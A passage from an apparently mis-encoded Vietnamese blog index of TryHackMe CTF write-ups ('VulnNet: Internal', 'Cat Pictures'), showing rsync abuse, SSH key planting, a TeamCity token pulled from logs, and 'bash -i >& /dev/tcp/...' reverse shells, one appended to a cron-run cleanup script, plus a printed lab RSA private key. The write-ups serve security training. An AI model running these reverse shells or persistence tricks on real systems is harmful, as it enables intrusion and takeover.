cÃ³ thá»ƒ lÃ  base64\nSau 1 lÃºc thá»­ cho Ä‘Ãºng format cá»§a Ä‘oáº¡n code nÃ y thÃ¬ tÃ´i Ä‘Ã£ decrypt Ä‘Æ°á»£c\nNÃ³ á»Ÿ Ä‘Ã¢y\nNhá»› ráº±ng bÃªn trÃªn cÅ©ng cÃ³ rsync vá»›i port 873. TÃ´i quay trá»Ÿ láº¡i Book Hacktrick Ä‘á»ƒ tÃ¬m cÃ¡ch khai thÃ¡c.\nSá»­ dá»¥ng metasploit tÃ´i tÃ¬m Ä‘Æ°á»£c file share lÃ  files\nmsf6 auxiliary(scanner/rsync/modules_list) \u0026gt; run [+] 10.10.116.142:873 - 1 rsync modules found: files [*] 10.10.116.142:873 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/rsync/modules_list) \u0026gt; BÃ¢y giá» thá»­ rsync nhÆ° hÆ°á»›ng dáº«n, thá»­ vá»›i password vá»«a tÃ¬m Ä‘Æ°á»£c á»Ÿ CyberChef phÃ­a trÃªn\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ rsync -av --list-only rsync://rsync-connect@10.10.116.142/files NÃ³ list ra táº¥t cáº£ cÃ¡c file cÃ³ trong thÆ° má»¥c share nÃ y, táº¥t nhiÃªn lÃ  quÃ¡ dÃ i nÃªn tÃ´i sáº½ khÃ´ng ghi vÃ o Ä‘Ã¢y. Äá»ƒ Ä‘á»c Ä‘Æ°á»£c cÃ¡c file nÃ y, tÃ´i pháº£i clone nÃ³ vá» mÃ¡y local\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ rsync -av rsync://rsync-connect@10.10.116.142/files /home/kali/rsync Quay láº¡i mÃ¡y local\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/rsync/sys-internal] â””â”€$ ll total 36 drwx------ 2 kali kali 4096 Feb 1 2021 Desktop drwxr-xr-x 2 kali kali 4096 Feb 1 2021 Documents drwxr-xr-x 2 kali kali 4096 Feb 1 2021 Downloads drwxr-xr-x 2 kali kali 4096 Feb 1 2021 Music drwxr-xr-x 2 kali kali 4096 Feb 1 2021 Pictures drwxr-xr-x 2 kali kali 4096 Feb 1 2021 Public drwxr-xr-x 2 kali kali 4096 Feb 1 2021 Templates -rw------- 1 kali kali 38 Feb 6 2021 user.txt drwxr-xr-x 2 kali kali 4096 Feb 1 2021 Videos Váº­y lÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c user-flag\nPrivilege escalation # Quay trá»Ÿ láº¡i pháº§n list file á»Ÿ phÃ­a trÃªn Ä‘á»ƒ xem cho dá»…, tÃ´i nháº­n ra cÃ³ thÆ° má»¥c .ssh, nhÆ°ng bÃªn trong khÃ´ng cÃ³ gÃ¬.\nVáº­y thÃ¬ tÃ´i sáº½ thá»­ táº£i public key cá»§a mÃ¬nh lÃªn mÃ¡y Ä‘á»ƒ login ssh\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/rsync] â””â”€$ cp ~/.ssh/id_rsa.pub authorized_keys â”Œâ”€â”€(kaliã‰¿kali)-[~/rsync] â””â”€$ rsync authorized_keys rsync://rsync-connect@10.10.116.142/files/sys-internal/.ssh Password: SSH # â”Œâ”€â”€(kaliã‰¿kali)-[~/rsync] â””â”€$ ssh sys-internal@10.10.116.142 Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 541 packages can be updated. 342 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. sys-internal@vulnnet-internal:~$ id uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom) Tuy nhiÃªn sau khi dáº¡o quanh 1 vÃ²ng tÃ´i cÅ©ng khÃ´ng tÃ¬m Ä‘Æ°á»£c gÃ¬ quÃ¡ Ä‘áº·c biá»‡t. Máº¥t 1 lÃºc khÃ¡ lÃ¢u Ä‘á»ƒ ngá»“i xem láº¡i tá»« Ä‘áº§u xem tÃ´i cÃ³ bá» sÃ³t gÃ¬ khÃ´ng, quay ngÆ°á»£c láº¡i RCE ban Ä‘áº§u tÃ´i nháº­n ra cÃ²n 1 thÆ° má»¥c khÃ¡ thÃº vá»‹ mÃ  tÃ´i Ä‘Ã£ bá» qua Ä‘Ã³ lÃ  TeamCity\nredis@vulnnet-internal:/$ ls -la ls -la total 533816 drwxr-xr-x 24 root root 4096 Feb 6 2021 . drwxr-xr-x 24 root root 4096 Feb 6 2021 .. drwx------ 2 root root 4096 Feb 1 2021 .cache drwxr-xr-x 12 root root 4096 Feb 6 2021 TeamCity drwxr-xr-x 2 root root 4096 Feb 2 2021 bin drwxr-xr-x 3 root root 4096 Feb 1 2021 boot drwxr-xr-x 6 root root 380 Nov 23 07:20 dev drwxr-xr-x 129 root root 12288 Feb 7 2021 etc d--------- 2 root root 40 Nov 23 07:20 home lrwxrwxrwx 1 root root 34 Feb 1 2021 initrd.img -\u0026gt; boot/initrd.img-4.15.0-135-generic lrwxrwxrwx 1 root root 33 Feb 1 2021 initrd.img.old -\u0026gt; boot/initrd.img-4.15.0-20-generic drwxr-xr-x 18 root root 4096 Feb 1 2021 lib drwxr-xr-x 2 root root 4096 Feb 1 2021 lib64 drwx------ 2 root root 16384 Feb 1 2021 lost+found drwxr-xr-x 4 root root 4096 Feb 2 2021 media drwxr-xr-x 2 root root 4096 Feb 1 2021 mnt drwxr-xr-x 4 root root 4096 Feb 2 2021 opt dr-xr-xr-x 133 root root 0 Nov 23 07:20 proc d--------- 2 root root 40 Nov 23 07:20 root drwxr-xr-x 27 root root 860 Nov 23 07:25 run drwxr-xr-x 2 root root 4096 Feb 2 2021 sbin drwxr-xr-x 2 root root 4096 Feb 1 2021 srv -rw------- 1 root root 546529280 Feb 1 2021 swapfile dr-xr-xr-x 13 root root 0 Nov 23 08:50 sys drwxrwxrwt 2 root root 4096 Nov 23 09:05 tmp drwxr-xr-x 10 root root 4096 Feb 1 2021 usr drwxr-xr-x 13 root root 4096 Feb 1 2021 var lrwxrwxrwx 1 root root 31 Feb 1 2021 vmlinuz -\u0026gt; boot/vmlinuz-4.15.0-135-generic lrwxrwxrwx 1 root root 30 Feb 1 2021 vmlinuz.old -\u0026gt; boot/vmlinuz-4.15.0-20-generic ÄÃ¢y lÃ  1 pháº§n má»m giÃºp thiáº¿t láº­p mÃ¡y chá»§ cho cÃ¡c dá»± Ã¡n cÅ©ng nhÆ° tÃ­ch há»£p cÃ¡c cÃ´ng cá»¥ Ä‘á»ƒ phÃ¡t triá»ƒn dá»± Ã¡n\nTháº±ng nÃ y cÃ³ cá»•ng máº·c Ä‘á»‹nh lÃ  8111, vÃ  khi kiá»ƒm tra cÃ¡c service Ä‘ang cháº¡y trÃªn Ä‘Ã¢y thÃ¬ tÃ´i cÅ©ng tháº¥y cÃ³ 8111\nredis@vulnnet-internal:/$ ss -ltp ss -ltp Cannot open netlink socket: Address family not supported by protocol State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 0 0.0.0.0:45863 0.0.0.0:* LISTEN 0 0 0.0.0.0:rsync 0.0.0.0:* LISTEN 0 0 0.0.0.0:netbios-ssn 0.0.0.0:* LISTEN 0 0 0.0.0.0:6379 0.0.0.0:* users:((\u0026#34;ss\u0026#34;,pid=19207,fd=6),(\u0026#34;bash\u0026#34;,pid=2072,fd=6),(\u0026#34;python\u0026#34;,pid=2071,fd=6),(\u0026#34;sh\u0026#34;,pid=538,fd=6)) LISTEN 0 0 0.0.0.0:36171 0.0.0.0:* LISTEN 0 0 0.0.0.0:sunrpc 0.0.0.0:* LISTEN 0 0 127.0.0.53:domain 0.0.0.0:* LISTEN 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN 0 0 127.0.0.1:ipp 0.0.0.0:* LISTEN 0 0 0.0.0.0:microsoft-ds 0.0.0.0:* LISTEN 0 0 0.0.0.0:nfs 0.0.0.0:* LISTEN 0 0 0.0.0.0:36545 0.0.0.0:* LISTEN 0 0 0.0.0.0:47331 0.0.0.0:* LISTEN 0 0 [::ffff:127.0.0.1]:56551 *:* LISTEN 0 0 [::ffff:127.0.0.1]:8105 *:* LISTEN 0 0 *:rsync *:* LISTEN 0 0 [::1]:6379 *:* users:((\u0026#34;ss\u0026#34;,pid=19207,fd=7),(\u0026#34;bash\u0026#34;,pid=2072,fd=7),(\u0026#34;python\u0026#34;,pid=2071,fd=7),(\u0026#34;sh\u0026#34;,pid=538,fd=7)) LISTEN 0 0 *:34283 *:* LISTEN 0 0 *:netbios-ssn *:* LISTEN 0 0 *:55021 *:* LISTEN 0 0 [::ffff:127.0.0.1]:8111 *:* LISTEN 0 0 *:sunrpc *:* LISTEN 0 0 *:36497 *:* LISTEN 0 0 *:43635 *:* LISTEN 0 0 *:ssh *:* LISTEN 0 0 [::1]:ipp *:* LISTEN 0 0 *:microsoft-ds *:* LISTEN 0 0 *:nfs *:* LISTEN 0 0 *:9090 *:* LISTEN 0 0 *:37411 *:* Sá»­ dá»¥ng SSH Ä‘á»ƒ chuyá»ƒn tiáº¿p káº¿t ná»‘i vá»›i port 8111\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.116.142 bind [127.0.0.1]:8111: Address already in use channel_setup_fwd_listener_tcpip: cannot listen to port: 8111 Could not request local forwarding. Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 541 packages can be updated. 342 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Nov 23 11:25:55 2022 from 10.6.0.191 sys-internal@vulnnet-internal:~$ Truy cáº­p 127.0.0.1:8111\nVÃ o as a Super user:\nÄiá»u nÃ y cÃ³ nghÄ©a lÃ  tÃ´i cáº§n token Ä‘á»ƒ login. VÃ  viá»‡c Ä‘áº§u tiÃªn tÃ´i nghÄ© Ä‘áº¿n lÃ  tÃ¬m nÃ³ bÃªn trong log, vÃ¬ cÃ³ thá»ƒ nhá»¯ng phiÃªn Ä‘Äƒng nháº­p trÆ°á»›c Ä‘Ã³ váº«n cÃ²n ghi láº¡i trong log.\nTÃ¬m tá»« khÃ³a token bÃªn trong táº¥t cáº£ cÃ¡c file táº¡i thÆ° má»¥c /logs\nsys-internal@vulnnet-internal:/TeamCity$ grep -iR token /TeamCity/logs/ 2\u0026gt;/dev/null /TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server) /TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server) /TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server) /TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server) /TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 1189775395164371106 (use empty username with the token as the password to access the server) Vá»›i token cuá»‘i cÃ¹ng thÃ¬ tÃ´i Ä‘Ã£ tÃ¬m Ä‘Äƒng nháº­p thÃ nh cÃ´ng. Hiá»‡n táº¡i tÃ´i Ä‘ang truy cáº­p vá»›i root, cÃ³ nghÄ©a lÃ  tÃ´i cÃ³ thá»ƒ toÃ n quyá»n sá»­ dá»¥ng TeamCity vÃ  sáº½ tÃ¬m cÃ¡ch Ä‘á»ƒ RCE\nSau khi máº¥t 1 thá»i gian tÆ°Æ¡ng Ä‘á»‘i Ä‘á»ƒ tÃ¬m hiá»ƒu thÃªm vá» TeamCity, tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c cÃ¡ch láº¥y RCE. Äáº§u tiÃªn váº«n pháº£i táº¡o 1 project má»›i, sau Ä‘Ã³ chá»n Buil Step vá»›i command line vÃ  nháº­p payload vÃ o Custom script, nÃ³ sáº½ giá»‘ng nhÆ° tháº¿ nÃ y\nSau Ä‘Ã³ save nÃ³ láº¡i. Tiáº¿p theo táº¡o listener vá»›i port Ä‘Ã£ thÃªm trong payload, á»Ÿ Ä‘Ã¢y tÃ´i dÃ¹ng port 9001\nnc -lnvp 9001\nSau khi Ä‘Ã£ save xong, tÃ´i chá»n Run á»Ÿ cá»­a sá»• tiáº¿p theo\nQuay trá»Ÿ láº¡i listener\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.6.0.191] from (UNKNOWN) [10.10.211.50] 49704 root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# id id uid=0(root) gid=0(root) groups=0(root) root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# cd cd root@vulnnet-internal:~# ls /root ls /root root.txt root@vulnnet-internal:~# ","date":"8 April 2022","externalUrl":null,"permalink":"/ctf/tryhackme/vulnnet-internal/","section":"Ctf","summary":"","title":"Tryhackme - VulnNet: Internal","type":"ctf"},{"content":"","date":"5 April 2022","externalUrl":null,"permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | Cat Pictures\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 ftp ftp 162 Apr 02 2021 note.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.6.0.191 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37436480d35a746281b7806b1a23d84a (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIDEV5ShmazmTw/1A6+19Bz9t3Aa669UOdJ6wf+mcv3vvJmh6gC8V8J58nisEufW0xnT69hRkbqrRbASQ8IrvNS8vNURpaA0cycHDntKA17ukX0HMO7AS6X8uHfIFZwTck5v6tLAyHlgBh21S+wOEqnANSms64VcSUma7fgUCKeyJd5lnDuQ9gCnvWh4VxSNoW8MdV64sOVLkyuwd0FUTiGctjTMyt0dYqIUnTkMgDLRB77faZnMq768R2x6bWWb98taMT93FKIfjTjGHV/bYsd/K+M6an6608wMbMbWz0pa0pB5Y9k4soznGUPO7mFa0n64w6ywS7wctcKngNVg3H | 256 53c682efd27733efc13d9c1513540eb2 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCs+ZcCT7Bj2uaY3QWJFO4+e3ndWR1cDquYmCNAcfOTH4L7lBiq1VbJ7Pr7XO921FXWL05bAtlvY1sqcQT6W43Y= | 256 ba97c323d4f2cc082ce12b3006189541 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq9I/445X/oJstLHIcIruYVdW4KqIFZks9fygfPkkPq 4420/tcp open nvm-express? syn-ack | fingerprint-strings: | DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: | INTERNAL SHELL SERVICE | please note: cd commands do not work at the moment, the developers are fixing it at the moment. | ctrl-c | Please enter password: | Invalid password... | Connection Closed | NULL, RPCCheck: | INTERNAL SHELL SERVICE | please note: cd commands do not work at the moment, the developers are fixing it at the moment. | ctrl-c |_ Please enter password: 8080/tcp open http syn-ack Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27 |_http-title: Cat Pictures - Index page | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Vá»›i ftp port 21, tÃ´i cÃ³ user Anonymous cÃ³ 1 file tÃªn note.txt. Truy cáº­p vÃ o nÃ³ Ä‘á»ƒ láº¥y file nÃ y vá»\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ ftp 10.10.107.28 Connected to 10.10.107.28. 220 (vsFTPd 3.0.3) Name (10.10.107.28:kali): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ftp\u0026gt; dir 229 Entering Extended Passive Mode (|||60158|) 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 162 Apr 02 2021 note.txt 226 Directory send OK. ftp\u0026gt; get note.txt /home/kali/note.txt local: /home/kali/note.txt remote: note.txt 229 Entering Extended Passive Mode (|||53132|) 150 Opening BINARY mode data connection for note.txt (162 bytes). 100% |************************************************| 162 176.96 KiB/s 00:00 ETA 226 Transfer complete. 162 bytes received in 00:00 (0.50 KiB/s) ftp\u0026gt; note.txt\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ cat note.txt In case I forget my password, I\u0026#39;m leaving a pointer to the internal shell service on the server. Connect to port 4420, the password is sardinethecat. - catlover â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ Sau khi tÃ¬m hiá»ƒu 1 chÃºt thÃ¬ tÃ´i biáº¿t Ä‘Æ°á»£c port 4420 vá»›i service nvm-express hay cÃ²n gá»i lÃ  NVMe lÃ  1 chuáº©n giao tiáº¿p cho á»• cá»©ng SSD. Sá»­ dá»¥ng netcat Ä‘á»ƒ káº¿t ná»‘i Ä‘áº¿n port nÃ y\nnc 10.10.107.28 4420\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nc 10.10.107.28 4420 INTERNAL SHELL SERVICE please note: cd commands do not work at the moment, the developers are fixing it at the moment. do not use ctrl-c Please enter password: sardinethecat Password accepted ls bin etc home lib lib64 opt tmp usr Shell nÃ y khÃ³ dÃ¹ng quÃ¡. Tuy nhiÃªn sau khi tÃ¬m kiáº¿m xung quanh 1 lÃºc thÃ¬ tÃ´i tÃ¬m tháº¥y wget trong thÆ° má»¥c /usr/bin\nÄiá»u nÃ y cÃ³ nghÄ©a lÃ  tÃ´i cÃ³ thá»ƒ táº£i lÃªn tá»‡p báº±ng wget. Váº­y thÃ¬ tÃ´i sáº½ táº¡o 1 file sh chá»©a RCE vÃ  Ä‘áº©y nÃ³ lÃªn machine\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.6.0.191/9001 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; exploit.sh Táº¡o local http server\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Táº£i file RCE lÃªn mÃ¡y\nwget http://10.6.0.191:8000/exploit.sh ERROR: could not open HSTS store. HSTS will be disabled. http://10.6.0.191:8000/exploit.sh Connecting to 10.6.0.191:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 41 [text/x-sh] Saving to: \u0026#39;exploit.sh\u0026#39; 0K 100% 5.61M=0s BÃ¢y giá» thÃ¬ táº¡o listener vÆ¡i port 9001\nnc -lnvp 9001\nTrÃªn machine thá»±c hiá»‡n cháº¡y file sh vá»«a táº£i lÃªn\nbash exploit.sh\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.6.0.191] from (UNKNOWN) [10.10.107.28] 47420 bash: cannot set terminal process group (1839): Inappropriate ioctl for device bash: no job control in this shell I have no name!@cat-pictures:/# SSH # TÃ´i tÃ¬m tháº¥y 1 file runme trong thÆ° má»¥c user /home/catlover. Thá»­ cat nÃ³ vÃ  tÃ´i nháº­n ra Ä‘áº¥y lÃ  1 file binary. NhÆ°ng nhÃ¬n ká»¹ thÃ¬ cÃ³ 1 dÃ²ng cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c.\nI have no name!@cat-pictures:/home/catlover# cat runme cat runme UU ï¿½=x - = 888 XXXDDSï¿½td888 Pï¿½tdï¿½ ï¿½ ï¿½ ddQï¿½tdRï¿½t=ï¿½ï¿½/lib64/ld-linux-x86-64.so.2GNUï¿½GNUï¿½ï¿½Oï¿½yï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?8ï¿½ï¿½GNUâ–’ï¿½â–’â–’ï¿½eï¿½msï¿½ï¿½ Cï¿½ï¿½ï¿½/ï¿½ï¿½*Fï¿½m]ï¿½Sï¿½; ï¿½Pâ–’ , ...... rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd ...... Äiá»u nÃ y cÃ³ nghÄ©a lÃ  khi nháº­p Ä‘Ãºng password, tÃ´i sáº½ nháº­n Ä‘Æ°á»£c ssh key\nCÃ³ 1 cÃ¡i tÃªn rebecca á»Ÿ phÃ­a trÆ°á»›c Ä‘oáº¡n nháº­p input. TÃ´i sáº½ thá»­ cháº¡y file nÃ y vÃ  nháº­p rebecca\nI have no name!@cat-pictures:/home/catlover# ./runme ./runme Please enter yout password: rebecca Welcome, catlover! SSH key transfer queued! I have no name!@cat-pictures:/home/catlover# ls -la ls -la total 32 drwxr-xr-x 2 0 0 4096 Nov 18 07:24 . drwxr-xr-x 3 0 0 4096 Apr 2 2021 .. -rw-r--r-- 1 0 0 1675 Nov 18 07:24 id_rsa -rwxr-xr-x 1 0 0 18856 Apr 3 2021 runme I have no name!@cat-pictures:/home/catlover# I have no name!@cat-pictures:/home/catlover# cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5 IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s /+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63 zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/ oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv 00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK 68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ= -----END RSA PRIVATE KEY----- I have no name!@cat-pictures:/home/catlover# LÆ°u key nÃ y vá» vÃ o login ssh\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ ssh -i id_rsa catlover@10.10.213.118 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Nov 17 23:29:45 PST 2022 System load: 0.41 Usage of /: 37.2% of 19.56GB Memory usage: 60% Swap usage: 0% Processes: 100 Users logged in: 0 IP address for eth0: 10.10.213.118 IP address for br-98674f8f20f9: 172.18.0.1 IP address for docker0: 172.17.0.1 52 updates can be applied immediately. 25 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Last login: Fri Jun 4 14:40:35 2021 root@7546fa2336d6:/# id uid=0(root) gid=0(root) groups=0(root) root@7546fa2336d6:/# ls root/ flag.txt Privilege escalation # Khi kiá»ƒm tra qua cÃ¡c thÆ° má»¥c, tÃ´i nháº­n ra Ä‘Ã¢y lÃ  1 container chá»© khÃ´ng pháº£i 1 machine, vÃ¬ nÃ³ .dockerenv vÃ  thÆ° má»¥c gá»‘c cÅ©ng giá»‘ng vá»›i docker image\nroot@7546fa2336d6:/# ls -la total 108 drwxr-xr-x 1 root root 4096 Mar 25 2021 . drwxr-xr-x 1 root root 4096 Mar 25 2021 .. -rw------- 1 root root 588 Jun 4 2021 .bash_history -rwxr-xr-x 1 root root 0 Mar 25 2021 .dockerenv drwxr-xr-x 1 root root 4096 Apr 9 2021 bin drwxr-xr-x 3 root root 4096 Mar 24 2021 bitnami drwxr-xr-x 2 root root 4096 Jan 30 2021 boot ThÃªm 1 Ä‘iá»u ná»¯a, bÃªn trong /opt/clean cÃ³ 1 file clean.sh, file sh nÃ y sáº½ xÃ³a háº¿t nhá»¯ng gÃ¬ cÃ³ trong thÆ° má»¥c /tmp, nhÆ°ng thá»±c sá»± thÃ¬ Ä‘iá»u khÃ´ng quan trá»ng láº¯m vÃ¬ tÃ´i chá»‰ cáº§n thÃªm RCE vÃ o file sh nÃ y Ä‘á»ƒ nÃ³ tá»± thá»±c thi.\nroot@7546fa2336d6:/# echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.6.0.191/2402 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; opt/clean/clean.sh root@7546fa2336d6:/# cat opt/clean/clean.sh #!/bin/bash rm -rf /tmp/* bash -i \u0026gt;\u0026amp; /dev/tcp/10.6.0.191/2402 0\u0026gt;\u0026amp;1 root@7546fa2336d6:/# Táº¡o listener vá»›i port 2402 vÃ  chá» thÃ´i\nnc -lnvp 2402\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.6.0.191] from (UNKNOWN) [10.10.213.118] 34968 bash: cannot set terminal process group (2329): Inappropriate ioctl for device bash: no job control in this shell root@cat-pictures:~# root@cat-pictures:~# id id uid=0(root) gid=0(root) groups=0(root) root@cat-pictures:~# ls /root ls /root firewall root.txt root@cat-pictures:~# ","date":"5 April 2022","externalUrl":null,"permalink":"/ctf/tryhackme/cat-pictures/","section":"Ctf","summary":"","title":"Tryhackme - Cat Pictures","type":"ctf"},{"content":"","date":"30 March 2022","externalUrl":null,"permalink":"/tags/socat/","section":"Tags","summary":"","title":"Socat","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | All in One\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | 